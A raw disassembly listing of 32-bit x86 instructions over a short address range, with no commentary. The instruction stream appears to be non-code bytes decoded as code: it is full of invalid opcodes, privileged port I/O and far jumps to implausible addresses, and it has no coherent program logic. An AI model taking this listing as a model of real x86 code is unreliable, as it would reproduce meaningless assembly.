  40a71e:	cwde   
  40a71f:	cmp    DWORD PTR [ecx+ebp*1],esi
  40a722:	dec    edx
  40a723:	cmp    BYTE PTR [ecx-0x5bde9612],ch
  40a729:	ins    BYTE PTR es:[edi],dx
  40a72a:	mov    ch,0x4e
  40a72c:	jnp    0x40a7a2
  40a72e:	test   eax,0xd80d07d6
  40a733:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a734:	fucomi st,st(5)
  40a736:	outs   dx,DWORD PTR gs:[esi]
  40a738:	fidivr WORD PTR [ebp+0x3b3f2475]
  40a73e:	stos   BYTE PTR es:[edi],al
  40a73f:	mov    dh,0x4b
  40a741:	pop    ebp
  40a742:	jmp    0x2ef9:0x7cb39ab5
  40a749:	mov    al,ds:0x46cfce94
  40a74e:	jmp    0x667d1f37
  40a753:	aaa    
  40a754:	rcr    ch,0x1c
  40a757:	sbb    eax,0x3b76af95
  40a75c:	or     dh,BYTE PTR [esi-0x6822b664]
  40a762:	push   ss
  40a763:	add    eax,0x5d698b52
  40a768:	jno    0x40a727
  40a76a:	addr16 jae 0x40a6ee
  40a76d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a76e:	jle    0x40a711
  40a770:	pop    edi
  40a771:	mov    ah,0x22
  40a773:	fs ret 0xbc91
  40a777:	int3   
  40a778:	lahf   
  40a779:	nop
  40a77a:	dec    BYTE PTR [eax-0x19]
  40a77d:	adc    eax,0xbe0490d2
  40a782:	add    ebx,DWORD PTR [eax+eax*1+0x7f]
  40a786:	and    bh,BYTE PTR [eax-0x15447bfb]
  40a78c:	in     eax,dx
  40a78d:	fcmovnu st,st(5)
  40a78f:	test   al,0x40
  40a791:	and    DWORD PTR cs:[edi],0xb5abdacc
  40a798:	fidivr WORD PTR [eax]
  40a79a:	mov    ds:0xa2132404,al
  40a79f:	xchg   edi,eax
  40a7a0:	ror    ebx,0x31
  40a7a3:	inc    ecx
  40a7a4:	lods   al,BYTE PTR ds:[esi]
  40a7a5:	sbb    eax,0x8e81187f
  40a7aa:	cmp    esi,DWORD PTR [edx+0x2]
  40a7ad:	or     DWORD PTR [eax],edx
  40a7af:	aas    
  40a7b0:	push   edx
  40a7b1:	int3   
  40a7b2:	pushf  
  40a7b3:	lea    esp,[esi-0x57aa5c5f]
  40a7b9:	repnz pop ss
  40a7bb:	fisttp QWORD PTR [ebp+0x44194591]
  40a7c1:	dec    ebx
  40a7c2:	fxam   
  40a7c4:	push   ebx
  40a7c5:	je     0x40a7c7
  40a7c7:	and    esi,ecx
  40a7c9:	fdivr  st,st(5)
  40a7cb:	xchg   edi,eax
  40a7cc:	or     eax,0x4ab8d9bb
  40a7d1:	pop    es
  40a7d2:	mov    BYTE PTR [ecx-0x6417f964],al
  40a7d8:	scas   eax,DWORD PTR es:[edi]
  40a7d9:	shl    BYTE PTR [ecx],1
  40a7db:	pop    edx
  40a7dc:	mov    ds:0xb9db0bf3,al
  40a7e1:	dec    ebp
  40a7e2:	cmp    DWORD PTR [ebx-0x162c3f1c],ebp
  40a7e8:	in     eax,0xa
  40a7ea:	popa   
  40a7eb:	lahf   
  40a7ec:	push   0xfffffffc
  40a7ee:	daa    
  40a7ef:	sub    eax,0x58736e10
  40a7f4:	push   ds
  40a7f5:	loopne 0x40a86f
  40a7f7:	pop    ecx
  40a7f8:	add    bl,BYTE PTR [ecx+0x58]
  40a7fb:	adc    al,0x4d
  40a7fd:	mov    esi,DWORD PTR ds:0x24cb9ed0
  40a803:	shl    DWORD PTR [edi-0x74d4714b],1
  40a809:	(bad)  
  40a80a:	cmp    eax,0x6d7a84d8
  40a80f:	idiv   bh
  40a811:	sub    esi,DWORD PTR [ecx]
  40a813:	mov    ds:0x430b0cb7,al
  40a818:	(bad)  
  40a819:	or     al,0xe5
  40a81b:	cld    
  40a81c:	fcom   QWORD PTR [ecx-0x341a185e]
  40a822:	xor    esp,DWORD PTR [esi+0x30734add]
  40a828:	bound  edx,QWORD PTR fs:[ebp+0x50c43c30]
  40a82f:	out    0x8c,al
  40a831:	pop    es
  40a832:	ret    0x4e22
  40a835:	mov    ecx,DWORD PTR [ecx-0x581c1f29]
  40a83b:	and    al,0x5d
  40a83d:	xor    DWORD PTR [ecx+eiz*8+0x44c79e61],esi
  40a844:	xchg   esi,eax
  40a845:	mov    DWORD PTR [ebx],esp
  40a847:	jmp    0x9523:0x83a737a1
  40a84e:	mov    ebx,0xc7942a6a
  40a853:	test   DWORD PTR [ebx+0xcb72d85],0xf9b1167e
  40a85d:	daa    
  40a85e:	xlat   BYTE PTR ds:[ebx]
  40a85f:	inc    ebp
  40a860:	aam    0x8
  40a862:	jmp    0x30ed:0x85f24b0b
  40a869:	test   al,0x81
  40a86b:	and    edx,0x3f
  40a86e:	lods   al,BYTE PTR ds:[esi]
  40a86f:	into   
  40a870:	daa    
  40a871:	cmp    bh,BYTE PTR [edi-0x1a3ae337]
  40a877:	rcl    BYTE PTR [ebx],0xb9
  40a87a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a87b:	sbb    BYTE PTR [eax-0x5377a1f1],0x48
  40a882:	ret    
  40a883:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40a885:	outs   dx,BYTE PTR ds:[esi]
  40a886:	dec    eax
  40a887:	lea    ecx,[ebp+eax*4-0x3e]
  40a88b:	sbb    ebx,edx
  40a88d:	xchg   edi,eax
  40a88e:	fimul  WORD PTR ds:0x324db972
  40a894:	sub    edx,DWORD PTR [edx+0x2f]
  40a897:	and    eax,0xfaec5ae2
  40a89c:	cmp    ebp,edx
  40a89e:	ror    DWORD PTR [eax+0x12717b55],1
  40a8a4:	scas   al,BYTE PTR es:[edi]
  40a8a5:	mov    bh,BYTE PTR [eax+0x5f]
  40a8a8:	sahf   
  40a8a9:	fcmovnu st,st(7)
  40a8ab:	nop
  40a8ac:	ficom  DWORD PTR [ebx+0x55]
  40a8af:	js     0x5ade60d1
  40a8b5:	xchg   ebp,eax
  40a8b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8b7:	push   0x50
  40a8b9:	mov    ecx,0x9b1f4ced
  40a8be:	adc    ecx,0x3
  40a8c1:	cmp    eax,DWORD PTR [ecx]
  40a8c3:	fisubr WORD PTR [eax]
  40a8c5:	or     eax,0xf7c270f2
  40a8ca:	mov    eax,0x8fa41c7b
  40a8cf:	test   DWORD PTR [eax-0x75ba8aa4],eax
  40a8d5:	pop    eax
  40a8d6:	dec    ecx
  40a8d7:	dec    edi
  40a8d8:	stc    
  40a8d9:	into   
  40a8da:	and    eax,edi
  40a8dc:	adc    bl,BYTE PTR [edi+ecx*8-0x32]
  40a8e0:	add    ebp,ebx
  40a8e2:	in     al,0xe7
  40a8e4:	xor    dl,BYTE PTR [esi+esi*2]
  40a8e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8e8:	int3   
  40a8e9:	pop    ecx
  40a8ea:	aaa    
  40a8eb:	xchg   ecx,eax
  40a8ec:	pop    edx
  40a8ed:	dec    ebp
  40a8ee:	retf   
  40a8ef:	sbb    BYTE PTR [ebx-0x48554c3d],bl
  40a8f5:	sub    DWORD PTR [edi-0x7e],ebp
  40a8f8:	mov    ch,0x37
  40a8fa:	push   ds
  40a8fb:	pop    DWORD PTR [edx]
  40a8fd:	mov    esp,0x1d06f7ab
  40a902:	call   0x1e21:0x8a2ccd8e
  40a909:	lods   eax,DWORD PTR ds:[esi]
  40a90a:	nop
  40a90b:	mov    edi,cs
  40a90d:	push   es
  40a90e:	pop    es
  40a90f:	dec    edx
  40a910:	pushf  
  40a911:	into   
  40a912:	les    ebp,FWORD PTR [ebx+0x3cd4e34]
  40a918:	mov    ds:0x75f42ecc,al
  40a91d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a91e:	push   edi
  40a91f:	mov    esp,DWORD PTR [ebx+0x2bd05c8]
  40a925:	loopne 0x40a8d8
  40a927:	pop    ds
  40a928:	neg    ch
  40a92a:	and    ecx,DWORD PTR [edi-0x19]
  40a92d:	sbb    al,0x41
  40a92f:	dec    ebp
  40a930:	lahf   
  40a931:	add    dh,ch
  40a933:	mov    cl,0xeb
  40a935:	ins    DWORD PTR es:[edi],dx
  40a936:	setb   BYTE PTR [edi]
  40a939:	xchg   BYTE PTR [edi+0x1d],ah
  40a93c:	shl    DWORD PTR [eax-0x76],0xb6
  40a940:	and    edi,DWORD PTR [esi+0x65]
  40a943:	loope  0x40a8c7
  40a945:	cs jge 0x40a8e2
  40a948:	popa   
  40a949:	mov    cl,0x65
  40a94b:	jmp    0x40a8d9
  40a94d:	cmp    BYTE PTR [ecx-0x13],0x5e
  40a951:	loopne 0x40a98d
  40a953:	lds    ebp,FWORD PTR [ecx+eax*8+0x4ce9ac8]
  40a95a:	cmp    eax,0xfd08ae1c
  40a95f:	fadd   QWORD PTR [ecx]
  40a961:	fild   QWORD PTR [ebx+eiz*4-0x18]
  40a965:	xchg   dl,cl
  40a967:	push   edi
  40a968:	adc    BYTE PTR [ebp+esi*8-0x15],al
  40a96c:	cmp    al,0x79
  40a96e:	or     DWORD PTR [ebp-0x2c],edx
  40a971:	inc    esp
  40a972:	inc    eax
  40a973:	fsub   DWORD PTR [ebx+0x31c6ef7d]
  40a979:	cmp    bh,bl
  40a97b:	or     al,0x32
  40a97d:	lods   al,BYTE PTR ds:[esi]
  40a97e:	dec    eax
  40a97f:	sbb    BYTE PTR [eax],al
  40a981:	call   0x24ee9a9e
  40a986:	sbb    edi,DWORD PTR [edi+0x60f50bec]
  40a98c:	inc    esp
  40a98d:	test   BYTE PTR [ebx+edi*2],0xff
  40a991:	outs   dx,BYTE PTR ds:[esi]
  40a992:	shr    DWORD PTR [ecx+0x66],cl
  40a995:	jl     0x40aa12
  40a997:	push   0xef7178f8
  40a99c:	xchg   BYTE PTR [esi-0x7],bl
  40a99f:	arpl   WORD PTR [edx-0x8d60c79],cx
  40a9a5:	mov    DWORD PTR [ecx],ecx
  40a9a7:	int3   
  40a9a8:	push   es
  40a9a9:	push   cs
  40a9aa:	fst    DWORD PTR [esi+edi*8-0x6d7c3631]
  40a9b1:	iret   
  40a9b2:	fdivr  QWORD PTR [ecx-0xd0607d0]
  40a9b8:	cwde   
  40a9b9:	rcr    DWORD PTR [edx-0x3f2ccb75],cl
  40a9bf:	jne    0x40a9b8
  40a9c1:	pop    eax
  40a9c2:	in     al,0x99
  40a9c4:	test   eax,0x5647bd7a
  40a9c9:	cmp    dl,bh
  40a9cb:	inc    ebp
  40a9cc:	enter  0x9da7,0xe3
  40a9d0:	adc    BYTE PTR [edx+edi*4-0x5c99fcf9],al
  40a9d7:	jno    0x40a969
  40a9d9:	sbb    DWORD PTR [ebx+0x32],0xd68beb37
  40a9e0:	shr    esi,cl
  40a9e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9e3:	and    esp,DWORD PTR [esi-0x32]
  40a9e6:	xchg   esi,eax
  40a9e7:	stos   DWORD PTR es:[edi],eax
  40a9e8:	dec    edi
  40a9e9:	inc    ebx
  40a9ea:	stos   BYTE PTR es:[edi],al
  40a9eb:	mov    al,ds:0xcef71379
  40a9f0:	add    BYTE PTR [eax+0x10],cl
  40a9f3:	and    DWORD PTR [eax-0x19],edx
  40a9f6:	fidiv  WORD PTR [edx-0x15]
  40a9f9:	xor    eax,DWORD PTR [esi-0x35204da4]
  40a9ff:	push   ds
  40aa00:	lds    eax,FWORD PTR [edx+0x6d9a89d0]
  40aa06:	fld    DWORD PTR [edx-0x5d]
  40aa0a:	mov    ss,WORD PTR [esi+ebx*2+0x20edc54e]
  40aa11:	mov    bl,0x5e
  40aa13:	jp     0x40aa1e
  40aa15:	call   0x27d4:0x6b7067de
  40aa1c:	inc    edx
  40aa1d:	or     BYTE PTR [eax+esi*2],cl
  40aa20:	std    
  40aa21:	(bad)  
  40aa22:	stos   BYTE PTR es:[edi],al
  40aa23:	sti    
  40aa24:	mov    ds:0xcbc0a848,al
  40aa29:	inc    edx
  40aa2a:	lea    esi,[ebx-0x65]
  40aa2d:	jne    0x40a9ed
  40aa2f:	push   edi
  40aa30:	dec    edi
  40aa31:	daa    
  40aa32:	sub    DWORD PTR [ebp+eiz*8-0x25],0x5081e1a1
  40aa3a:	fistp  QWORD PTR [edx-0x4c]
  40aa3d:	popf   
  40aa3e:	push   esi
  40aa3f:	ds mov dl,0xa8
  40aa42:	mov    gs,WORD PTR [eax-0x2ba38a09]
  40aa48:	es clc 
  40aa4a:	or     eax,0x922a7c21
  40aa4f:	mov    eax,ds:0x607526ff
  40aa54:	mov    edi,0x61fc28ac
  40aa59:	push   es
  40aa5a:	int3   
  40aa5b:	pushf  
  40aa5c:	xchg   DWORD PTR [eax+0x52f3e7b0],eax
  40aa62:	jo     0x40aabc
  40aa64:	imul   DWORD PTR [eax]
  40aa66:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40aa68:	xchg   edx,eax
  40aa69:	mov    al,BYTE PTR [eax]
  40aa6b:	scas   al,BYTE PTR es:[edi]
  40aa6c:	popf   
  40aa6d:	xor    DWORD PTR [edi],ebp
  40aa6f:	add    esi,DWORD PTR [ecx-0x2a755492]
  40aa75:	adc    bh,dh
  40aa77:	nop
  40aa78:	or     eax,0xedd8a212
  40aa7d:	or     DWORD PTR [ecx],0xffffffae
  40aa80:	inc    ecx
  40aa81:	pcmpeqb mm1,QWORD PTR [esi-0x1bd29577]
  40aa88:	ret    
  40aa89:	push   esi
  40aa8a:	add    eax,0xf43f3382
  40aa8f:	fst    DWORD PTR [eax-0xcfe26b]
  40aa95:	inc    edi
  40aa96:	and    ebx,DWORD PTR gs:0x638ebc02
  40aa9d:	dec    ebp
  40aa9e:	adc    eax,0x4022781a
  40aaa3:	adc    eax,0x5af9467e
  40aaa8:	aas    
  40aaa9:	and    dh,al
  40aaab:	inc    eax
  40aaac:	xlat   BYTE PTR ds:[ebx]
  40aaad:	push   es
  40aaae:	adc    cl,BYTE PTR [edx]
  40aab0:	dec    ebp
  40aab1:	push   0x897d35b0
  40aab6:	dec    ebp
  40aab7:	or     BYTE PTR [ebp+0x3],al
  40aaba:	pop    edx
  40aabb:	pop    es
  40aabc:	dec    ecx
  40aabd:	inc    ebx
  40aabe:	pop    esp
  40aabf:	adc    al,0x87
  40aac1:	ret    
  40aac2:	loope  0x40aa63
  40aac4:	add    dl,BYTE PTR [ebx-0x1c175272]
  40aaca:	(bad)  
  40aacb:	jecxz  0x40ab00
  40aacd:	adc    ebx,esi
  40aacf:	(bad)  
  40aad0:	pop    ecx
  40aad1:	das    
  40aad2:	inc    ecx
  40aad3:	mov    eax,0xe9d86ae3
  40aad8:	push   ds
  40aad9:	retf   0xc836
  40aadc:	adc    eax,0x2a2d589c
  40aae1:	xor    esp,edx
  40aae3:	out    dx,al
  40aae4:	ret    0x91
  40aae7:	adc    esp,DWORD PTR [ebx]
  40aae9:	mov    bh,0xb6
  40aaeb:	mov    al,0x17
  40aaed:	adc    dh,BYTE PTR [ebx]
  40aaef:	sti    
  40aaf0:	fwait
  40aaf1:	jb     0x40aaf0
  40aaf3:	and    eax,0xfeaf2ff2
  40aaf8:	je     0x40aabf
  40aafa:	jae    0x40ab46
  40aafc:	dec    ecx
  40aafd:	or     al,0x64
  40aaff:	rcr    BYTE PTR [ecx+0x41dc9554],cl
  40ab05:	xchg   BYTE PTR [ecx],dh
  40ab07:	mov    cl,0xc8
  40ab09:	(bad)  
  40ab0a:	xor    ah,bh
  40ab0c:	push   ebx
  40ab0d:	les    esi,FWORD PTR [edi-0x5]
  40ab10:	aad    0x79
  40ab12:	enter  0xa0a7,0xcb
  40ab16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab17:	pop    ebx
  40ab18:	ret    0x87c6
  40ab1b:	into   
  40ab1c:	ds cmp al,bh
  40ab1f:	fadd   QWORD PTR [ebx]
  40ab21:	mov    ch,0xa8
  40ab23:	push   ebx
  40ab24:	mov    eax,0x968d5d1d
  40ab29:	push   esp
  40ab2a:	fwait
  40ab2b:	or     DWORD PTR [edx],edx
  40ab2d:	pop    ecx
  40ab2e:	into   
  40ab2f:	mov    ds:0x12f5efb4,eax
  40ab34:	mov    ebp,0x94cbbb8e
  40ab39:	rcl    BYTE PTR [edx],0x45
  40ab3c:	retf   0x687a
  40ab3f:	mov    edi,0xda5e3a82
  40ab44:	sub    DWORD PTR [esi+0x75ea4fae],ebp
  40ab4a:	pop    edx
  40ab4b:	mov    esp,0xbed35919
  40ab50:	and    BYTE PTR [esi+edi*4-0x489d3637],dh
  40ab57:	sbb    bh,BYTE PTR [eax-0x3c]
  40ab5a:	aaa    
  40ab5b:	std    
  40ab5c:	sub    esi,esp
  40ab5e:	dec    edx
  40ab5f:	dec    esp
  40ab60:	pop    ebx
  40ab61:	out    0xd5,al
  40ab63:	or     DWORD PTR [edx-0x1],0x1f545783
  40ab6a:	pushf  
  40ab6b:	outs   dx,DWORD PTR ds:[esi]
  40ab6c:	xchg   edx,ebx
  40ab6e:	sbb    eax,0xf6e7039
  40ab73:	adc    al,0xc4
  40ab75:	sbb    ebx,DWORD PTR [ecx-0x1e]
  40ab78:	cmp    DWORD PTR [eax],edi
  40ab7a:	loope  0x40ab2f
  40ab7c:	aas    
  40ab7d:	test   BYTE PTR [eax+eax*2+0x34],0xba
  40ab82:	iret   
  40ab83:	fnstenv [esi+ecx*1-0x71]
  40ab87:	add    dh,BYTE PTR [eax+0x1e432640]
  40ab8d:	pop    edx
  40ab8e:	test   eax,0xd3726417
  40ab93:	mov    bh,0xf8
  40ab95:	jns    0x40ab7f
  40ab97:	dec    ecx
  40ab98:	fbstp  TBYTE PTR [eax+edi*4]
  40ab9b:	pushf  
  40ab9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab9d:	jne    0x40ab23
  40ab9f:	pop    esp
  40aba0:	pop    eax
  40aba1:	dec    ebx
  40aba2:	dec    eax
  40aba3:	add    eax,DWORD PTR [esi]
  40aba5:	loopne 0x40ab64
  40aba7:	out    dx,eax
  40aba8:	popf   
  40aba9:	xchg   ebp,eax
  40abaa:	or     DWORD PTR [edx-0x35],ebx
  40abad:	fs jb  0x40ab6a
  40abb0:	(bad)  
  40abb1:	cld    
  40abb2:	mov    esi,esp
  40abb4:	scas   eax,DWORD PTR es:[edi]
  40abb5:	cld    
  40abb6:	adc    edx,DWORD PTR [esi-0x1d]
  40abb9:	xor    eax,0xe37a1e6e
  40abbe:	jl     0x40ac23
  40abc0:	cwde   
  40abc1:	jg     0x40ab60
  40abc3:	push   esp
  40abc4:	in     eax,dx
  40abc5:	int3   
  40abc6:	mov    ebp,0x115f603b
  40abcb:	add    ah,BYTE PTR [ebx+0x3095c6a8]
  40abd1:	cs out 0xe5,al
  40abd4:	mov    BYTE PTR [ecx],bh
  40abd6:	(bad)  
  40abd7:	fbld   TBYTE PTR ds:0x945704f3
  40abdd:	cmp    ebp,DWORD PTR [ecx-0x1aa8ec2e]
  40abe3:	xchg   edx,eax
  40abe4:	jne    0x40ac5d
  40abe6:	fwait
  40abe7:	inc    ecx
  40abe8:	push   edi
  40abe9:	fldl2e 
  40abeb:	lods   al,BYTE PTR ds:[esi]
  40abec:	inc    esp
  40abed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abee:	jae    0x40ab85
  40abf0:	pop    ss
  40abf1:	imul   esi,DWORD PTR [ecx+0x7bc2c40d],0xc9eac999
  40abfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abfc:	mov    ds:0xb1ebad2f,eax
  40ac01:	mov    dh,0xd2
  40ac03:	and    DWORD PTR [ecx+edx*8+0x76b04f38],ecx
  40ac0a:	cdq    
  40ac0b:	mov    ebp,0xd55b1721
  40ac10:	sub    bh,dh
  40ac12:	mov    eax,ds:0xf05af6a5
  40ac17:	cmp    eax,0xe977367d
  40ac1c:	xchg   esi,eax
  40ac1d:	jg     0x40ac46
  40ac1f:	fistp  QWORD PTR [edi-0x6a47799d]
  40ac25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac26:	mov    ds:0xca9abc0a,al
  40ac2b:	pop    ecx
  40ac2c:	push   ecx
  40ac2d:	jb     0x40ac7e
  40ac2f:	icebp  
  40ac30:	inc    edx
  40ac31:	das    
  40ac32:	rcr    edx,1
  40ac34:	sub    BYTE PTR gs:[eax],bl
  40ac37:	jno    0x40ac39
  40ac39:	and    BYTE PTR [edx],ah
  40ac3b:	pop    eax
  40ac3c:	outs   dx,BYTE PTR ds:[esi]
  40ac3d:	in     eax,0x2f
  40ac3f:	jae    0x40ac8e
  40ac41:	mov    al,ds:0x69fc3689
  40ac46:	sbb    al,0x50
  40ac48:	jmp    0xc7edcd5c
  40ac4d:	fbstp  TBYTE PTR [ecx-0x57d64f03]
  40ac53:	inc    ebx
  40ac54:	outs   dx,BYTE PTR ds:[esi]
  40ac55:	fild   DWORD PTR ds:0x9169f763
  40ac5b:	js     0x40aca0
  40ac5d:	stc    
  40ac5e:	dec    esi
  40ac5f:	setp   BYTE PTR [edi+0x56]
  40ac63:	push   ebx
  40ac64:	lahf   
  40ac65:	aam    0x2e
  40ac67:	lahf   
  40ac68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac69:	(bad)  
  40ac6a:	jne    0x40acc4
  40ac6c:	scas   eax,DWORD PTR es:[edi]
  40ac6d:	fcomip st,st(3)
  40ac6f:	and    al,0xb5
  40ac71:	mov    dh,0xd0
  40ac73:	mov    ds:0x6a007faa,eax
  40ac78:	mov    esp,0x62f94bd8
  40ac7d:	les    ecx,FWORD PTR [esi-0x18341d0c]
  40ac83:	and    DWORD PTR [eax+0x20],esp
  40ac86:	ins    DWORD PTR es:[edi],dx
  40ac87:	les    edi,FWORD PTR [ebx-0x1643b81d]
  40ac8d:	dec    ecx
  40ac8e:	jne    0x40ac6d
  40ac90:	cli    
  40ac91:	out    dx,al
  40ac92:	call   0x5dabcd7d
  40ac97:	and    dh,BYTE PTR [eax-0x10a1831c]
  40ac9d:	sub    eax,0xbad045ef
  40aca2:	add    al,0xda
  40aca4:	add    DWORD PTR [eax+0x14],eax
  40aca7:	adc    DWORD PTR [ebp-0x2f],edi
  40acaa:	xor    eax,0x66070834
  40acaf:	add    al,0x2d
  40acb1:	aas    
  40acb2:	enter  0x430b,0xdd
  40acb6:	sub    esi,DWORD PTR [edx-0x5a]
  40acb9:	and    DWORD PTR [edx-0x5f],edi
  40acbc:	les    edx,FWORD PTR [eax+0x3beb7360]
  40acc2:	jge    0x40acb5
  40acc4:	jbe    0x40acd3
  40acc6:	or     al,0xe5
  40acc8:	scas   eax,DWORD PTR es:[edi]
  40acc9:	outs   dx,DWORD PTR ds:[esi]
  40acca:	popa   
  40accb:	call   0x421a0d21
  40acd0:	mov    eax,ds:0x102bce70
  40acd5:	mov    ebx,0x77a81286
  40acda:	mov    al,0xea
  40acdc:	mov    esi,0x90544056
  40ace1:	lods   eax,DWORD PTR ds:[esi]
  40ace2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ace3:	or     BYTE PTR [ecx],al
  40ace5:	(bad)  
  40ace6:	pop    ds
  40ace7:	jnp    0x40ad22
  40ace9:	(bad)  
  40aceb:	aas    
  40acec:	jb     0x40ad11
  40acee:	push   esp
  40acef:	adc    al,0x39
  40acf1:	pusha  
  40acf2:	inc    edx
  40acf3:	jmp    0x40ad01
  40acf5:	je     0x40ac98
  40acf7:	mov    ds:0x51f71a28,al
  40acfc:	in     al,0xa7
  40acfe:	pop    ecx
  40acff:	inc    ebp
  40ad00:	mov    cl,0x93
  40ad02:	mov    ds,WORD PTR [edx-0x6394c183]
  40ad08:	adc    eax,0x613d0976
  40ad0d:	dec    esp
  40ad0e:	js     0x40acbf
  40ad10:	dec    edi
  40ad11:	mov    WORD PTR ss:[ebp+0x6e747299],fs
  40ad18:	adc    eax,0xc4ec479e
  40ad1d:	cdq    
  40ad1e:	mov    esp,0xf6776ee2
  40ad23:	pop    ecx
  40ad24:	enter  0x1add,0x73
  40ad28:	push   esp
  40ad29:	push   ecx
  40ad2a:	leave  
  40ad2b:	mov    ds:0x644d67d5,eax
  40ad30:	sbb    esp,DWORD PTR [esi]
  40ad32:	lea    ecx,[ecx]
  40ad34:	mov    ebx,0x40fb73cd
  40ad39:	leave  
  40ad3a:	adc    cl,0xad
  40ad3d:	scas   eax,DWORD PTR es:[edi]
  40ad3e:	xor    edx,esp
  40ad40:	pop    esp
  40ad41:	dec    edx
  40ad42:	cmp    esi,DWORD PTR [ebx+edi*1-0x2c]
  40ad46:	sub    ecx,DWORD PTR [edx]
  40ad48:	not    dl
  40ad4a:	repnz fucomip st,st(6)
  40ad4d:	or     BYTE PTR [ebp-0x75],ah
  40ad50:	sub    DWORD PTR [edi],edx
  40ad52:	fmul   DWORD PTR [ecx]
  40ad54:	push   0x62
  40ad56:	cmp    eax,0x514f578a
  40ad5b:	retf   0x20d9
  40ad5e:	jbe    0x40ad07
  40ad60:	popf   
  40ad61:	call   0x545bd3a9
  40ad66:	hlt    
  40ad67:	pop    ds
  40ad68:	dec    ebx
  40ad69:	loop   0x40adc6
  40ad6b:	inc    ecx
  40ad6c:	mov    cl,BYTE PTR [ecx+0x40]
  40ad6f:	sahf   
  40ad70:	arpl   WORD PTR [eax],cx
  40ad72:	fwait
  40ad73:	rcl    BYTE PTR [edx-0x3a158e6],cl
  40ad79:	add    eax,0xe785fbde
  40ad7e:	(bad)  
  40ad7f:	and    eax,0xbc0cb9fb
  40ad84:	push   ebx
  40ad85:	inc    eax
  40ad86:	shl    DWORD PTR [edi-0x75],1
  40ad89:	mov    ebx,0x808e0b16
  40ad8e:	jb     0x40ad24
  40ad90:	inc    ecx
  40ad91:	sub    BYTE PTR [edx+0x91aadd9],cl
  40ad97:	ret    
  40ad98:	sub    BYTE PTR [esi+edi*1-0x4e],dh
  40ad9c:	xor    al,0x22
  40ad9e:	fbld   TBYTE PTR [ecx+0x531b5467]
  40ada4:	pop    eax
  40ada5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ada6:	jmp    0x5bfa:0x59df5eec
  40adad:	sbb    eax,DWORD PTR [ebp+0x25e10853]
  40adb3:	sbb    dh,BYTE PTR [esi+edi*2]
  40adb6:	cwde   
  40adb7:	inc    ecx
  40adb8:	mov    dh,0xb7
  40adba:	mov    edi,0x6582c76
  40adbf:	scas   al,BYTE PTR es:[edi]
  40adc0:	mov    eax,0xea212d3e
  40adc5:	mov    bh,0x5f
  40adc7:	dec    eax
  40adc8:	sbb    eax,0xc1997971
  40adcd:	xchg   edi,eax
  40adce:	fs mov al,0xf3
  40add1:	sub    dl,BYTE PTR [edx+0x74]
  40add4:	cmp    eax,0xd09f428a
  40add9:	fsubr  QWORD PTR [esi]
  40addb:	add    cl,ch
  40addd:	jns    0x40ae02
  40addf:	mov    esp,0xf972e233
  40ade4:	xchg   DWORD PTR [ecx],esp
  40ade6:	leave  
  40ade7:	ror    eax,cl
  40ade9:	loopne 0x40ae63
  40adeb:	lock mov ecx,0x4cfeac84
  40adf1:	fcmovu st,st(1)
  40adf3:	xchg   ebx,eax
  40adf4:	or     DWORD PTR [ecx],esi
  40adf6:	and    al,BYTE PTR [ebp-0x2b7b456]
  40adfc:	ins    BYTE PTR es:[edi],dx
  40adfd:	mov    DWORD PTR [edi],ebx
  40adff:	xchg   ecx,eax
  40ae00:	je     0x40adb3
  40ae02:	mov    al,ds:0x3610ee58
  40ae07:	sbb    DWORD PTR [edi],ecx
  40ae09:	inc    ecx
  40ae0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae0b:	repz inc edi
  40ae0d:	cmp    ebx,edx
  40ae0f:	jne    0x40ae80
  40ae11:	mov    esp,0xeef53af5
  40ae16:	dec    esp
  40ae17:	mov    eax,0x73eec790
  40ae1c:	pusha  
  40ae1d:	adc    ebx,DWORD PTR [esi-0xa]
  40ae20:	pop    esp
  40ae21:	inc    edx
  40ae22:	imul   esp,DWORD PTR [ebp+0x2007bbe1],0xe274a61f
  40ae2c:	adc    dh,dh
  40ae2e:	aad    0xdf
  40ae30:	or     BYTE PTR [edi],ch
  40ae32:	icebp  
  40ae33:	adc    ecx,ecx
  40ae35:	xlat   BYTE PTR ds:[ebx]
  40ae36:	aas    
  40ae37:	add    al,0xc2
  40ae3a:	aaa    
  40ae3b:	and    bh,BYTE PTR [edx+edx*4]
  40ae3e:	fst    QWORD PTR [ecx]
  40ae40:	daa    
  40ae41:	test   al,0x6
  40ae43:	mov    al,ds:0xd561ac73
  40ae48:	sbb    DWORD PTR [edi-0x58ab8cc9],edi
  40ae4e:	scas   al,BYTE PTR es:[edi]
  40ae4f:	lods   al,BYTE PTR ds:[esi]
  40ae50:	dec    esi
  40ae51:	xor    bl,BYTE PTR [ecx-0x10b72e62]
  40ae57:	loopne 0x40ae6b
  40ae59:	push   ebp
  40ae5a:	lods   al,BYTE PTR ds:[esi]
  40ae5b:	pop    es
  40ae5c:	out    0x7f,eax
  40ae5e:	std    
  40ae5f:	(bad)  
  40ae60:	cmp    bh,BYTE PTR [eax+0x53]
  40ae63:	xlat   BYTE PTR ds:[ebx]
  40ae64:	dec    esi
  40ae65:	mov    esi,0xb4d326c0
  40ae6a:	fst    DWORD PTR [esi-0x58d5c77c]
  40ae70:	sub    al,0xb5
  40ae72:	mov    DWORD PTR [ecx+0x73d4a9db],esi
  40ae78:	push   eax
  40ae79:	pusha  
  40ae7a:	jle    0x40ae9c
  40ae7c:	inc    esi
  40ae7d:	mov    DWORD PTR [eax-0x14],esp
  40ae80:	lods   eax,DWORD PTR ds:[esi]
  40ae81:	mov    esi,edx
